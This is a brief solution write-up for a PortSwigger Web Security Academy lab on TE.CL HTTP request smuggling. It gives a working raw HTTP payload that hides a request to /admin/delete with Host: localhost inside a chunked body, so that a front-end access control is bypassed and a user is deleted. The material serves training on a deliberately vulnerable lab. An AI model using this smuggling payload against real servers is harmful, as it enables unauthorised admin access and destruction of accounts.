# Lab 09 — Exploiting HTTP request smuggling to bypass front-end security controls (TE.CL)

> **Practitioner** · [Official lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)

**Entry point:** same as lab 08, but the desync is TE.CL ("Update
Content-Length" **off**).

## Solution

Final working smuggle (send twice; `\r\n\r\n` after the final `0`;
chunk-size hex must match the embedded request):

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

(Use chunk `71` with `POST /admin` first to probe.) The back-end reads the
embedded request as a separate one with `Host: localhost` — carlos is
deleted — lab solved.
